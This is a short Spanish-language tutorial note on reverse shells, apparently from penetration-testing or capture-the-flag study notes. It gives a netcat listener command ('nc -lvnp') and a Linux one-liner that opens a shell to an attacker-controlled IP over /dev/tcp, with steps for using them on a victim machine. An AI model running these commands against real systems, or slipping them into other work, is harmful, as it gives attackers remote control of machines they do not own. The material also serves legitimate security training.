# Reverse Shells

Una reverse shell permite ejecutar comandos en la maquina victima desde nuestra maquina atacante. La victima se conecta hacia nosotros.

## Uso de Netcat para Recibir la Conexion

Netcat es el "estandar" para recibir conexiones de reverse shells.

```bash
nc -lvnp <puerto>
```

- `-l` -> Modo escucha (listen)
- `-v` -> Verbose (muestra detalles)
- `-n` -> Sin resolucion DNS
- `-p` -> Puerto en escucha

## Comando de Reverse Shell (Linux)

La pagina **[revshells.com](https://www.revshells.com/)** permite generar comandos personalizados introduciendo IP y puerto.

```bash
sh -i >& /dev/tcp/<IP_atacante>/<puerto> 0>&1
```

> Se coloca este comando en la maquina victima y se recibe con `nc -lvnp <puerto>` en la atacante.

## Secuencia Tipica

1. Ponerse en escucha: `nc -lvnp 4444`
2. Ejecutar comando reverse shell en la victima
3. Recibir la terminal interactiva
4. Realizar tratamiento de la TTY (ver apartado correspondiente)
